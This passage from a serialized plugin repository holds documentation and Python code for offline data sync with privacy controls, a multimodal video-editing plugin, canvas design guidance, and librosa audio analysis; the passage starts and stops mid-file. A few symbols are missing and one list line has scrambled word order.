privacy_sync.request_sync_permission(\n    data_type='usage_statistics',\n    purpose='improve_model_accuracy'\n):\n    # Prepare anonymized data\n    usage_stats = {\n        'model_type': 'text_generator',\n        'session_count': 42,\n        'avg_response_time': 1.23,\n        'user_email': 'user@example.com'  # Will be hashed\n    }\n\n    # Sync with privacy\n    privacy_sync.sync_with_privacy(\n        data=usage_stats,\n        destination=\"model_improvement_server\"\n    )\n```\n\n### Sync Error Reports (Anonymized)\n```python\n# Request permission\nif privacy_sync.request_sync_permission(\n    data_type='error_reports',\n    purpose='debug_and_fix_bugs'\n):\n    error_report = {\n        'error_type': 'out_of_memory',\n        'model_size': '7b',\n        'device_info': 'iPhone 14',  # Will be hashed\n        'stack_trace': '...'\n    }\n\n    # Sync with privacy\n    privacy_sync.sync_with_privacy(\n        data=error_report,\n        destination=\"debug_server\"\n    )\n```\n\n## Integration Points\n\n- Used by `IncrementalSync` for privacy-aware sync\n- Referenced by permission management system\n- Supports custom anonymization strategies\n\n## Security Guarantees\n\n1. **No raw data transmission**: Always encrypted/anonymized\n2. **Explicit consent**: Required for all data sharing\n3. **Purpose limitation**: Data used only for stated purpose\n4. revocation**: Users **Easy can revoke permissions anytime\n5. **Transparent**: Clear logging without sensitive data\n\n## Best Practices\n\n1. **Ask permission early** (before collecting data)\n2. **Be specific** about what and why\n3. **Make it easy to say no** (no dark patterns)\n4. **Honor permissions** strictly\n5. **Log anonymized actions** for transparency\n6. **Test anonymization** thoroughly\n7. **Keep permissions current** (expire old ones)\n",
        "plugins/sys-edge/skills/synchronizing-data/references/sync-states.md": "# Sync State Management\n\n## Overview\n\nThe `SyncStateManager` class tracks and manages the synchronization state across offline-first operations. It provides a clear state machine for tracking sync progress and handling transitions.\n\n## Implementation\n\n```python\nSYNC_STATES = {\n    'offline': 'All changes stored locally',\n    'syncing': 'In progress with remote server',\n    'conflict': 'Conflicts detected, awaiting resolution',\n    'up_to_date': 'Synchronized successfully',\n    'error': 'Sync failed, will retry'\n}\n\nclass SyncStateManager:\n    def __init__(self):\n        self.current_state = 'offline'\n        self.last_sync = None\n        self.pending_changes = []\n\n    def update_state(self, new_state: str, metadata: Dict = None):\n        \"\"\"Update sync state with metadata\"\"\"\n        self.current_state = new_state\n\n        if metadata:\n            self.local_store.store('__sync_metadata__', metadata)\n```\n\n## State Definitions\n\n### 1. Offline\n**Description**: All changes stored locally, no sync in progress\n**Transitions to**: `syncing` (when network available)\n**Characteristics**:\n- Changes accumulated locally\n- No network activity\n- Full functionality available\n\n### 2. Syncing\n**Description**: In progress with remote server\n**Transitions to**: `up_to_date` (success) or `error` (failure)\n**Characteristics**:\n- Active network requests\n- Changes being transmitted\n- UI shows progress indicator\n\n### 3. Conflict\n**Description**: Conflicts detected, awaiting resolution\n**Transitions to**: `syncing` (after resolution)\n**Characteristics**:\n- User intervention required\n- Conflicts listed for review\n- Can continue offline work\n\n### 4. Up-to-Date\n**Description**: Synchronized successfully\n**Transitions to**: `offline` (when network lost) or `syncing` (periodic check)\n**Characteristics**:\n- All changes synced\n- Local and remote in sync\n- No pending operations\n\n### 5. Error\n**Description**: Sync failed, will retry\n**Transitions to**: `syncing` (on retry) or `offline` (give up)\n**Characteristics**:\n- Sync attempt failed\n- Error logged\n- Automatic retry scheduled\n\n## State Transitions\n\n```\n     Network Available      \n Offline > Syncing \n                           \n     ^                                      \n                                           \n                                   Success       Failure\n                                           v              v\n                                         \n                                   Up-to-Date       Error \n                                         \n                                                         \n                   \n                            Network Lost                  \n                                                          \n                                              \n                          Offline <              \n                                               \n                                                          \n                                              \n                                               Retry Successful    \n                                                    \n                                                                   \n                                                         \n                                                                  \n                                                                  \n                                                   \n                                                   Syncing      \n                                                   \n```\n\n## Metadata Tracking\n\n### Sync Metadata Structure\n```python\n{\n    'last_sync_timestamp': 1234567890,\n    'items_synced': 42,\n    'conflicts_resolved': 3,\n    'sync_duration_ms': 1500,\n    'error_message': None,\n    'network_type': 'wifi'\n}\n```\n\n### Usage\n```python\nstate_manager = SyncStateManager()\n\n# Update state with metadata\nstate_manager.update_state(\n    new_state='syncing',\n    metadata={\n        'items_synced': 0,\n        'sync_start_time': time.time()\n    }\n)\n\n# Check current state\nif state_manager.current_state == 'conflict':\n    # Show conflict resolution UI\n    conflicts = state_manager.get_pending_conflicts()\n```\n\n## Integration Points\n\n- Used by `IncrementalSync` for state updates\n- Persists state in `EncryptedLocalStore`\n- Referenced by UI for status display\n\n## Best Practices\n\n1. **Persist state** across app restarts\n2. **Update frequently** during sync\n3. **Log state changes** for debugging\n4. **Handle all transitions** gracefully\n5. **Show clear UI** for each state\n6. **Retry failed syncs** automatically\n7. **Let users override** when needed\n\n## UI Integration\n\n```python\n# Display appropriate UI based on state\nif state_manager.current_state == 'offline':\n    show_offline_indicator()\nelif state_manager.current_state == 'syncing':\n    show_progress_indicator()\nelif state_manager.current_state == 'conflict':\n    show_conflict_resolution_ui()\nelif state_manager.current_state == 'up_to_date':\n    show_sync_success_indicator()\nelif state_manager.current_state == 'error':\n    show_error_with_retry_button()\n```\n",
        "plugins/sys-multimodal/.claude-plugin/plugin.json": "{\n  \"name\": \"sys-multimodal\",\n  \"version\": \"1.0.1\",\n  \"description\": \"MEDIA & MULTIMODAL DOMAIN - Advanced tools for video editing, media processing, multimodal AI, visual content creation, and data visualization\",\n  \"license\": \"MIT\",\n  \"author\": {\n    \"name\": \"Git-Fg\"\n  },\n  \"keywords\": [\n    \"multimodal\",\n    \"video\",\n    \"visual\",\n    \"canvas\",\n    \"data-visualization\",\n    \"storytelling\"\n  ]\n}\n",
        "plugins/sys-multimodal/README.md": "# sys-multimodal\n\n**Multimodal AI for Video Editing** - Vision and audio understanding for intelligent video editing.\n\n## Standards Integration\n\nThis plugin follows 2026 Universal Agentic Runtime standards:\n\n- **[Toolkit Registry Standards](../sys-core/skills/adhering-standards/SKILL.md)** - Component management\n- **[Execution Core](../sys-builder/skills/adhering-execution-standard/SKILL.md)** - Behavioral protocols\n- **[Security Standards](../sys-core/skills/auditing-security/SKILL.md)** - Security patterns\n\nFor component creation, use:\n- `use sys-core`  `toolkit-registry` skill\n- `use sys-builder`  `scaffold-component` skill\n\n## Purpose\n\nProvides comprehensive multimodal AI capabilities for video analysis and editing, combining vision and audio models to understand narrative flow and execute natural language editing commands.\n\n## Skills\n\n### multimodal-understanding\n**Comprehensive video content analysis**\n\n- Frame-by-frame visual analysis (composition, lighting, color)\n- Audio analysis (dialogue, music, energy levels)\n- Scene detection and cut identification\n- Narrative flow and story beat detection\n- Three-act structure identification\n\n### intent-translation\n**Natural language to editing parameters**\n\n- Intent classification from user commands\n- Parameter translation (speed, color, effects)\n- Edit Decision List (EDL) generation\n- Feedback incorporation and learning\n- Semantic context analysis\n\n## Agents\n\n### video-editor\n**Autonomous AI video editor**\n\n- Combines multimodal analysis with intent translation\n- Executes natural language editing commands\n- Applies cinematic grades and effects\n- Enhances dialogue and audio\n- Creates story-driven edits\n\n## Implementation Example\n\n```python\n# Analyze and edit video with multimodal AI\nfrom multimodal import MultimodalAnalyzer, IntentTranslator, VideoEditor\n\n# Step 1: Understand the video\nanalyzer = MultimodalAnalyzer()\nanalysis = analyzer.analyze_video(\"video.mp4\")\n\n# Step 2: Translate user command\ntranslator = IntentTranslator()\nintent = translator.classify_intent(\"Make this cinematic with warm colors\")\nedl = translator.generate_edl(intent, analysis['metadata'])\n\n# Step 3: Execute the edit\neditor = VideoEditor()\nresult = editor.apply_edl(\"video.mp4\", edl)\n```\n\n## Roadmap Alignment\n\n**Project 3: Cursor for Video Editors (Advanced Level)**\n- [x] Multimodal understanding (vision + audio)\n- [x] Intent translation (natural language  parameters)\n- [x] Scene detection and story beats\n- [x] Automated editing with reasoning\n- [x] Feedback incorporation\n\n## Features\n\n- **Multimodal Analysis**: Vision + audio combined\n- **Natural Language Editing**: \"Make this cinematic\"  executable edits\n- **Story Understanding**: Three-act structure detection\n- **Intelligent Cuts**: Automatic scene boundary detection\n- **Audio Processing**: Speech/music classification\n\n## Supported Edit Commands\n\n### Speed and Pacing\n```python\n\"slow down the jump\"  speed: 0.5x\n\"speed up transitions\"  transition_duration: 0.2s\n\"freeze frame\"  speed: 0.0\n```\n\n### Color Grading\n```python\n\"make it cinematic\"  kodak_2383_lut\n\"vintage look\"  fujifilm_3510_lut\n\"warm colors\"  orange_teal_grade\n```\n\n### Visual Effects\n```python\n\"blur background\"  depth_of_field_blur\n\"add film grain\"  film_grain_effect\n\"sharpen details\"  unsharp_mask\n```\n\n### Transitions\n```python\n\"smooth cuts\"  cross_dissolve\n\"sharp cuts\"  hard_cut\n\"dramatic transition\"  wipe_effect\n```\n\n## Technical Details\n\n### Analysis Capabilities\n- Scene detection: > 95% accuracy\n- Speech/music classification: > 90% accuracy\n- Color palette: 5 dominant colors\n- Narrative structure: Three-act detection\n\n### Performance\n- Frame analysis: < 100ms per frame\n- Real-time processing: 30fps capability\n- EDL generation: < 500ms per command\n- Batch processing: Multiple videos\n\n### Supported Formats\n- Video: MP4, MOV, AVI, MKV\n- Resolution: 720p to 4K\n- Audio: Stereo, 5.1, 7.1\n- Codecs: H.264, H.265, ProRes\n\n## Integration with CatToolkit\n\n### Planning Workflow\n```bash\nDirector: \"Plan cinematic edit for this video\"\nVideo Editor:\n1. Analyze video content\n2. Identify key scenes and narrative beats\n3. Create edit plan\n4. Present for approval\n```\n\n### Execution Workflow\n```bash\nDirector: \"Execute cinematic edit plan\"\nVideo Editor:\n1. Load edit plan\n2. Apply edits in sequence\n3. Verify each modification\n4. Generate final output\n```\n\n## Use Cases\n\n### Content Creation\n- Social media videos\n- YouTube content\n- Marketing videos\n- Documentaries\n\n### Post-Production\n- Automated rough cuts\n- Color grading assistance\n- Audio enhancement\n- Transition optimization\n\n### Live Editing\n- Real-time stream editing\n- Event recording enhancement\n- Interactive editing sessions\n- AI-assisted workflows\n\n## Next Steps\n\n1. Build preview system for before/after comparison\n2. Add support for HDR and wide color gamut\n3. Implement custom LUT creation\n4. Build effect recommendation engine\n5. Integrate with professional editing software\n\n## Dependencies\n\n- FFmpeg for video processing\n- OpenCV for visual analysis\n- Librosa for audio analysis\n- PyTorch for AI models\n\n## License\n\nMIT\n",
        "plugins/sys-multimodal/agents/video-editor.md": "---\nname: video-editor\ndescription: \"Autonomous video editing runtime. Use for executing complex edit plans.\"\ntools: [Read, Write, Edit, Glob, Grep, Bash(ffmpeg:*), Bash(ffprobe:*), TodoWrite]\nskills: [processing-media, generating-ui]\n\n---\n# Video Editor Configuration\nRuntime container for video processing skills.\n",
        "plugins/sys-multimodal/hooks/hooks.json": "{\n    \"hooks\": {\n        \"SessionStart\": [\n            {\n                \"hooks\": [\n                    {\n                        \"type\": \"command\",\n                        \"command\": \"if ! command -v ffmpeg >/dev/null 2>&1; then echo '{\\\"systemMessage\\\": \\\" sys-multimodal: FFmpeg binary not found. Video processing will fail. Please install ffmpeg.\\\"}'; fi\"\n                    }\n                ]\n            }\n        ]\n    }\n}",
        "plugins/sys-multimodal/skills/generating-ui/SKILL.md": "---\nname: generating-ui\ndescription: \"Creates beautiful visual art in .png and .pdf documents using design philosophy. Use when creating posters, artwork, designs, and static visual pieces with original designs. Never copy existing artists' work to avoid copyright violations.\"\nallowed-tools: [Read, Write, Edit, Bash]\n---\n\n# Canvas Design Protocol\n\n\n\n## When to Use This Skill\n\n- Creating posters or promotional artwork\n- Designing original visual art pieces\n- Developing brand visuals or identity elements\n- Creating artistic compositions or abstractions\n- Producing visual content for presentations or displays\n- Generating design-forward artwork with deep conceptual foundations\n\n## Two-Step Process\n\n### Step 1: Design Philosophy Creation\n\nCreate a **VISUAL PHILOSOPHY** (aesthetic movement manifesto) that serves as the foundation for all visual decisions.\n\n**Philosophy File Structure:**\n- **Movement Naming** (1-2 words): \"Brutalist Joy\", \"Chromatic Silence\", \"Metabolist Dreams\"\n- **Philosophical Articulation** (4-6 paragraphs): Emphasize space/form, color/material, scale/rhythm, composition/balance, visual hierarchy\n\n**Critical Guidelines:**\n- Avoid redundancy - each design aspect mentioned once with depth\n- Emphasize craftsmanship - work should appear meticulously crafted\n- Leave creative space - specific enough to guide, open enough for interpretation\n- Visual expression priority - ideas communicated through form, not text\n\nSee [references/philosophy-examples.md](references/philosophy-examples.md) for complete example structures.\n\n### Step 2: Canvas Creation\n\nExpress the design philosophy visually, creating original artwork that embodies the aesthetic principles.\n\n**Visual Creation Principles:**\n- Use form, space, color, and composition as primary communication tools\n- Create visual hierarchies that guide the eye naturally\n- Employ spatial relationships to convey meaning\n- Balance positive and negative space with intention\n\n**Typography (Minimal, Essential):**\n- Text always minimal and contextually appropriate\n- Font selection must be design-forward and visually integrated\n- Use different fonts from `./canvas-fonts` directory\n- Ensure perfect spacing, alignment, and readability\n- Text never overlaps, nothing falls off canvas boundaries\n\n\n\nSee [references/visual-principles.md](references/visual-principles.md) for detailed guidance.\n\n## File Outputs\n\n1. **Design Philosophy (.md)**: Written manifesto defining the aesthetic movement\n2. **Visual Artwork (.png)**: High-resolution raster artwork\n3. **Visual Artwork (.pdf)**: Vector-based or high-quality artwork suitable for print\n\n## Execution Process\n\n### 1. Deduce the Subtle Reference\n\nBefore creating the canvas, identify the conceptual framework from the request. The design philosophy provides the aesthetic language. The conceptual framework provides the soul woven invisibly into form, color, and composition.\n\n### 2. Canvas Creation\n\nUse the design philosophy as foundation to craft a masterpiece. Create **one single page, highly visual, design-forward output** unless multiple pages requested.\n\n**Composition Techniques:**\n- Use repeating patterns and perfect geometric shapes\n- Embrace systematic visual language\n- Create artifacts proving ephemeral concepts can be studied\n- Anchor with simple phrases positioned subtly\n- Use limited, intentional color palettes\n\n**Technical Execution:**\n- Search and download fonts from `./canvas-fonts` directory as needed\n- Make typography part of the art, not typeset digitally\n- Push boundaries and aesthetics to frontier\n- Follow design instinct guided by philosophy\n\n### 3. Refinement Phase\n\nQuality Standard: Work must be pristine, a masterpiece of craftsmanship, display-worthy.\n\n**Refinement Approach:**\n- Don't add more graphicsrefine what exists\n- Ask: \"How can I make what's already here more of a piece of art?\"\n- Avoid filters or font refactoring\n- Make existing composition more cohesive\n- Polish details rather than adding elements\n\n## Multi-Page Options\n\nWhen multiple pages requested, create additional creative pages following the same philosophy but distinctly different. Bundle in single .pdf or multiple .png files.\n\n\n\n## Copyright Compliance\n\n**CRITICAL**: Create only original designs. Never copy existing artists' work. This skill produces entirely original artwork inspired by philosophical frameworks, not existing pieces. All visual expression must be created from scratch.\n\n## Common Use Cases\n\n- **Artistic Posters**: Concert posters, event promotions, artistic statements\n- **Abstract Compositions**: Purely abstract artwork communicating concepts through color and form\n- **Brand Visuals**: Original brand elements, logos, identity systems\n- **Presentation Artwork**: Visually striking content for presentations\n- **Decorative Art**: Artwork suitable for interior spaces or galleries\n\n## Reference Materials\n\n- **[references/philosophy-examples.md](references/philosophy-examples.md)**: Complete philosophy structures and examples\n- **[references/visual-principles.md](references/visual-principles.md)**: Detailed design theory and techniques\n- **[references/composition-patterns.md](references/composition-patterns.md)**: Advanced composition techniques\n",
        "plugins/sys-multimodal/skills/generating-ui/references/composition-patterns.md": "# Advanced Composition Patterns\n\nThis document provides advanced composition techniques for creating sophisticated visual artwork.\n\n## Pattern-Based Composition\n\n### Repetition and Variation\n- Use repeating elements to create unity\n- Introduce variation to maintain interest\n- Balance predictability with surprise\n\n### Geometric Systems\n- Perfect shapes: circles, squares, triangles\n- Grid-based layouts with intentional breaks\n- Mathematical proportions (golden ratio, rule of thirds)\n\n## Spatial Organization\n\n### Centralization\n- Single focal point at center\n- Elements radiate outward\n- Creates stability and focus\n\n### Asymmetry\n- Off-center focal points\n- Dynamic tension through imbalance\n- More modern, energetic feel\n\n### Layering\n- Foreground, middle ground, background\n- Overlapping elements create depth\n- Transparency reveals hidden layers\n\n## Visual Flow\n\n### Directional Cues\n- Lines guide eye movement\n- Arrows, shapes point toward focal points\n- Reading direction (left-to-right)\n\n### Rhythm and Movement\n- Repeated elements create tempo\n- Scale changes suggest motion\n- Leading lines direct gaze\n\n## Balance Types\n\n### Symmetrical Balance\n- Mirror image across axis\n- Formal, stable, traditional\n- Can feel static\n\n### Asymmetrical Balance\n- Different elements with equal visual weight\n- Dynamic, modern, engaging\n- More visual interest\n\n### Radial Balance\n- Elements radiate from center point\n- Creates strong focal point\n- Natural, organic feel\n\n## Contrast Techniques\n\n### Scale Contrast\n- Large vs small elements\n- Creates hierarchy and emphasis\n\n### Color Contrast\n- Complementary colors\n- Light vs dark values\n- Warm vs cool temperatures\n\n### Texture Contrast\n- Smooth vs rough surfaces\n- Solid vs broken areas\n- Creates tactile variety\n\n## Negative Space\n\n### Breathing Room\n- Allow space around elements\n- Prevents visual clutter\n- Creates sophistication\n\n### Active Negative Space\n- Shape the voids intentionally\n- Space becomes design element\n- \"Figure-ground\" reversal\n\n## Unity Principles\n\n### Proximity\n- Related elements grouped together\n- Creates visual relationships\n\n### Repetition\n- Repeated colors, shapes, textures\n- Creates consistency and cohesion\n\n### Continuation\n- Lines, edges guide eye through composition\n- Creates flow and connection\n\n### Alignment\n- Elements aligned to common axis\n- Creates order and organization\n",
        "plugins/sys-multimodal/skills/generating-ui/references/philosophy-examples.md": "# Design Philosophy Examples\n\nThis document contains complete example structures for design philosophies.\n\n## Example 1: Concrete Poetry\n\nCommunication through monumental form and bold geometry. Visual expression through massive color blocks, sculptural typography, Brutalist spatial divisions. Ideas expressed through visual weight and spatial tension, not explanation. Text as rare, powerful gesturenever paragraphs, only essential words integrated into visual architecture.\n\n**Key Elements:**\n- Monumental form and bold geometry\n- Massive color blocks\n- Sculptural typography\n- Brutalist spatial divisions\n- Visual weight and spatial tension\n- Text as rare gesture\n\n## Example 2: Chromatic Language\n\nColor as primary information system. Geometric precision where color zones create meaning. Typography minimalsmall sans-serif labels letting chromatic fields communicate. Information encoded spatially and chromatically. Words only to anchor what color already shows.\n\n**Key Elements:**\n- Color as primary information system\n- Geometric precision\n- Minimal typography (small sans-serif)\n- Spatial and chromatic encoding\n- Text as anchor, not primary\n\n## Example 3: Analog Meditation\n\nQuiet visual contemplation through texture and breathing room. Paper grain, ink bleeds, vast negative space. Photography and illustration dominate. Japanese photobook aesthetic. Images breathe across pages. Text whispered sparinglyshort phrases, never explanatory blocks.\n\n**Key Elements:**\n- Texture and breathing room\n- Paper grain, ink bleeds\n- Vast negative space\n- Photography and illustration\n- Japanese photobook aesthetic\n- Text whispered sparingly\n\n## Example 4: Metabolist Dreams\n\nOrganic growth patterns manifest through cellular repetition and adaptive structures. Modular forms multiply like biological systems, creating cities from repeated units. Scale shifts from microscopic to urban. Natural materials meet industrial precision. Growth evident in every composition.\n\n**Key Elements:**\n- Cellular repetition\n- Adaptive structures\n- Modular multiplication\n- Scale shifts\n- Natural + industrial materials\n- Growth patterns\n\n## Philosophy Structure Template\n\n**Movement Name** (1-2 words)\n- Choose evocative, memorable pairing\n- Examples: \"Brutalist Joy\", \"Chromatic Silence\", \"Metabolist Dreams\"\n\n**Philosophical Articulation** (4-6 paragraphs)\n\nEmphasize how the aesthetic manifests through:\n\n1. **Space and form**: Spatial relationships and sculptural qualities\n2. **Color and material**: Chromatic systems and tactile representation\n3. **Scale and rhythm**: Proportional harmony and visual tempo\n4. **Composition and balance**: Visual equilibrium and tension\n5. **Visual hierarchy**: Information flow through design elements\n\n**Critical Guidelines:**\n- Avoid redundancy - each design aspect mentioned once with depth\n- Emphasize craftsmanship - work should appear meticulously crafted\n- Leave creative space - specific enough to guide, open enough for interpretation\n- Visual expression priority - ideas communicated through form, not text\n",
        "plugins/sys-multimodal/skills/generating-ui/references/visual-principles.md": "# Visual Design Principles\n\nThis document provides detailed guidance on visual design theory and techniques for creating museum-quality artwork.\n\n## Form and Space\n\n### Spatial Relationships\n- Use form, space, color, and composition as primary communication tools\n- Create visual hierarchies that guide the eye naturally\n- Employ spatial relationships to convey meaning\n- Balance positive and negative space with intention\n\n### Composition Techniques\n- Use repeating patterns and perfect geometric shapes\n- Embrace systematic visual language\n- Create artifacts proving ephemeral concepts can be studied\n- Anchor with simple phrases positioned subtly\n- Use limited, intentional color palettes\n\n## Color and Material\n\n### Color Systems\n- Develop cohesive color palettes that support the philosophy\n- Use color strategically to create mood, depth, and meaning\n- Consider material qualities even in digital medium (texture, opacity, layering)\n\n### Material Qualities\n- Texture: Surface quality and tactile feel\n- Opacity: Transparency and layering effects\n- Weight: Visual heaviness or lightness\n\n## Scale and Rhythm\n\n### Proportional Harmony\n- Create visual tempo through element sizing and repetition\n- Use scale contrasts to establish importance and flow\n- Establish rhythmic patterns that unite the composition\n\n### Visual Tempo\n- Fast: Many small elements, high frequency\n- Slow: Large elements, generous spacing\n- Varied: Mix of scales for dynamic interest\n\n## Typography\n\n### Minimal, Essential Text\n- Text always minimal and contextually appropriate\n- Font selection must be design-forward and visually integrated\n- Use different fonts from `./canvas-fonts` directory\n- Ensure perfect spacing, alignment, and readability\n- Text never overlaps, nothing falls off canvas boundaries\n\n### Typography as Art\n- Make typography part of the art, not typeset digitally\n- Integrate text into visual composition\n- Use scale, position, and font to create hierarchy\n- Treat text as visual element, not just information\n\n## Museum-Quality Craftsmanship\n\n### Execution Standards\n- Work must appear meticulously crafted through countless refinements\n- Every element placed with precision\n- Result should be display-worthy\n- Avoid amateur aesthetics\n\n### Refinement Approach\n- Don't add more graphicsrefine what exists\n- Ask: \"How can I make what's already here more of a piece of art?\"\n- Avoid filters or font refactoring\n- Make existing composition more cohesive\n- Polish details rather than adding elements\n\n## Visual Expression Priority\n\n### Communication Through Form\n- Ideas communicated through form, not text\n- Visual expression takes precedence over verbal explanation\n- Let the design speak for itself\n\n### Subtle Conceptual References\n- Weave subtle conceptual threads invisibly into form and color\n- Create sophisticated references that enhance depth without announcing themselves\n- Approach like jazz musician quoting another songonly those who know will catch it\n- Everyone should appreciate the artistry even without catching the reference\n",
        "plugins/sys-multimodal/skills/processing-media/SKILL.md": "---\nname: processing-media\ndescription: \"Handles video editing, ffmpeg processing, and visual analysis. Use when transforming raw footage into polished output or analyzing visual content.\"\nallowed-tools: [Read, Write, Edit, Glob, Bash(ffmpeg:*), Bash(ffprobe:*)]\n---\n\n# Video Editing Protocol\n\n\n\n## Standards & Styles\n\n### 1. Cinematic Style\n- **Color:** High contrast, teal/orange grading, 24fps.\n- **Motion:** Smooth stabilization, slow motion (60fps -> 24fps).\n- **Audio:** Music-driven cuts, immersive sound design.\n\n### 2. Vlog / Social Style\n- **Color:** Bright, saturated, natural skin tones.\n- **Motion:** Fast cuts, jump cuts, handheld feel.\n- **Audio:** Clear dialogue, background music ducking.\n\n### 3. Corporate / Explainers\n- **Color:** Clean, neutral, branded palette.\n- **Motion:** Static shots, smooth transitions, screen recordings.\n- **Audio:** Voiceover-dominant.\n\n## Workflow\n1.  **Analyze**: Use processing-media skill to understand video content (specs, visual content).\n2.  **Translate**: Convert natural language command to edit parameters (EDL/FFMPEG).\n3.  **Edit**: Apply changes using ffmpeg.\n4.  **Verify**: Validate output quality programmatically (Self-Verification).\n\n\n\n## Quality Standards\n- No artifacts or quality degradation\n- Clear dialogue, balanced audio levels\n- Narrative flow enhancement\n- Accurate intent interpretation\n\n## Reference Library\n- `references/edl-generation.md`: How to structure complex edits.\n- `references/frame-analysis.md`: Visual inspection protocols.\n- `references/ffmpeg-recipes.md`: (Common commands - *to be populated*)\n",
        "plugins/sys-multimodal/skills/processing-media/references/audio-processing.md": "# Audio Analysis\n\n## Overview\n\nThe `AudioAnalyzer` class provides comprehensive audio analysis for video understanding, detecting tempo, key, speech segments, energy levels, and music vs speech classification.\n\n## Implementation\n\n```python\nimport librosa\nimport numpy as np\nfrom typing import List, Dict\n\nclass AudioAnalyzer:\n    def __init__(self, sample_rate: int = 44100):\n        self.sample_rate = sample_rate\n        self.n_fft = 2048\n        self.hop_length = 512\n\n    def analyze_audio(self, audio_path: str) -> Dict:\n        \"\"\"Comprehensive audio analysis\"\"\"\n        y, sr = librosa.load(audio_path, sr=self.sample_rate)\n\n        return {\n            'tempo': self._detect_tempo(y, sr),\n            'key_signature': self._detect_key(y, sr),\n            'energy_levels': self._analyze_energy(y),\n            'speech_detection': self._detect_speech_segments(y, sr),\n            'music_vs_speech': self._classify_audio_content(y, sr),\n            'silence_detection': self._detect_silence(y),\n            'audio_features': self._extract_features(y, sr)\n        }\n```\n\n## Analysis Components\n\n### 1. Tempo Detection\n\n**BPM Analysis:**\n```python\ndef _detect_tempo(self, y: np.ndarray, sr: int) -> float:\n    \"\"\"Detect BPM of audio\"\"\"\n    tempo, _ = librosa.beat.beat_track(y=y, sr=sr)\n    return float(tempo)\n```\n\n**Output:**\n- Tempo in beats per minute (BPM)\n- Used for video editing synchronization\n- Helps identify rhythm changes\n\n### 2. Key Signature Detection\n\n**Musical Key Analysis:**\n```python\ndef _detect_key(self, y: np.ndarray, sr: int) -> Dict:\n    \"\"\"Detect musical key signature\"\"\"\n    chroma = librosa.feature.chroma_stft(y=y, sr=sr, hop_length=self.hop_length)\n    chroma_mean = np.mean(chroma, axis=1)\n\n    # Map to key names\n    keys = ['C', 'C#', 'D', 'D#', 'E', 'F', 'F#', 'G', 'G#', 'A', 'A#', 'B']\n    key_index = np.argmax(chroma_mean)\n    confidence = float(chroma_mean[key_index])\n\n    return {\n        'key': keys[key_index],\n        'confidence': confidence,\n        'chroma_profile': chroma_mean.tolist()\n    }\n```\n\n**Output:**\n- Musical key (C, D, E, etc.)\n- Confidence score (0.0 to 1.0)\n- Chroma feature vector\n\n### 3. Speech Detection\n\n**Segment Classification:**\n```python\ndef _detect_speech_segments(self, y: np.ndarray, sr: int) -> List[Dict]:\n    \"\"\"Detect speech segments in audio\"\"\"\n    # Use onset detection and spectral features\n    onset_frames = librosa.onset.onset_detect(y=y, sr=sr, hop_length=self.hop_length)\n    onset_times = librosa.frames_to_time(onset_frames, sr=sr, hop_length=self.hop_length)\n\n    # Classify segments\n    speech_segments = []\n    for i, onset_time in enumerate(onset_times):\n        segment_start = onset_time\n        segment_end = onset_times[i + 1] if i + 1 < len(onset_times) else len(y) / sr\n\n        # Extract segment\n        start_sample = int(segment_start * sr)\n        end_sample = int(segment_end * sr)\n        segment = y[start_sample:end_sample]\n\n        # Classify using spectral features\n        segment_type = self._classify_segment(segment, sr)\n        if segment_type == 'speech':\n            speech_segments.append({\n                'start': segment_start,\n                'end': segment_end,\n                'duration': segment_end - segment_start,\n                'energy': float(np.mean(segment**2))\n            })\n\n    return speech_segments\n```\n\n**Output:**\n- List of speech segments with timestamps\n- Duration of each segment\n- Energy levels for each segment\n\n### 4. Energy Analysis\n\n**Dynamic Range Detection:**\n```python\ndef _analyze_energy(self, y: np.ndarray) -> Dict:\n    \"\"\"Analyze audio energy levels over time\"\"\"\n    # Calculate RMS energy in windows\n    frame_length = int(0.025 * self.sample_rate)  # 25ms frames\n    hop_length = int(0.010 * self.sample_rate)   # 10ms hop\n\n    rms = librosa.feature.rms(y=y, frame_length=frame_length, hop_length=hop_length)[0]\n    times = librosa.frames_to_time(np.arange(len(rms)), sr=self.sample_rate, hop_length=hop_length)\n\n    return {\n        'rms_curve': rms.tolist(),\n        'timestamps': times.tolist(),\n        'avg_energy': float(np.mean(rms)),\n        'peak_energy': float(np.max(rms)),\n        'dynamic_range': float(np.max(rms) - np.min(rms))\n    }\n```\n\n**Output:**\n- RMS energy curve over time\n- Average energy level\n- Peak energy level\n- Dynamic range\n\n### 5. Music vs Speech Classification\n\n**Content Type Detection:**\n```python\ndef _classify_audio_content(self, y: np.ndarray, sr: int) -> Dict:\n    \"\"\"Classify audio as music or speech\"\"\"\n    # Extract spectral features\n    spectral_centroids = librosa.feature.spectral_centroid(y=y, sr=sr)[0]\n    spectral_rolloff = librosa.feature.spectral_rolloff(y=y, sr=sr)[0]\n    mfccs = librosa.feature.mfcc(y=y, sr=sr, n_mfcc=13)\n\n    # Simple heuristic classification\n    avg_centroid = np.mean(spectral_centroids)\n    avg_rolloff = np.mean(spectral_rolloff)\n\n    # Classify based on features\n    if avg_centroid > 2000 and avg_rolloff > 3000:\n        content_type = 'music'\n        confidence = 0.8\n    else:\n        content_type = 'speech'\n        confidence = 0.7\n\n    return {\n        'content_type': content_type,\n        'confidence': confidence,\n        'spectral_centroid': float(avg_centroid),\n        'spectral_rolloff': float(avg_rolloff)\n    }\n```\n\n### 6. Silence Detection\n\n**Quiet Segment Identification:**\n```python\ndef _detect_silence(self, y: np.ndarray) -> List[Dict]:\n    \"\"\"Detect silence segments in audio\"\"\"\n    # Calculate energy in small windows\n    window_size = int(0.1 * self.sample_rate)  # 100ms windows\n    hop_length = window_size // 2\n\n    silence_segments = []\n    for i in range(0, len(y) - window_size, hop_length):\n        window = y[i:i + window_size]\n        energy = np.mean(window ** 2)\n\n        # Threshold for silence (adjust based on audio)\n        if energy < 0.01:\n            silence_segments.append({\n                'start': i / self.sample_rate,\n                'end': (i + window_size) / self.sample_rate,\n                'duration': window_size / self.sample_rate\n            })\n\n    return silence_segments\n```\n\n### 7. Audio Features Extraction\n\n**Comprehensive Feature Set:**\n```python\ndef _extract_features(self, y: np.ndarray, sr: int) -> Dict:\n    \"\"\"Extract comprehensive audio features\"\"\"\n    # Spectral features\n    spectral_centroids = librosa.feature.spectral_centroid(y=y, sr=sr)[0]\n    spectral_rolloff = librosa.feature.spectral_rolloff(y=y, sr=sr)[0]\n    spectral_bandwidth = librosa.feature.spectral_bandwidth(y=y, sr=sr)[0]\n\n    # Zero crossing rate\n    zcr = librosa.feature.zero_crossing_rate(y)[0]\n\n    # MFCCs\n    mfccs = librosa.feature.mfcc(y=y, sr=sr, n_mfcc=13)\n\n    return {\n        'spectral_centroid': float(np.mean(spectral_centroids)),\n        'spectral_rolloff': 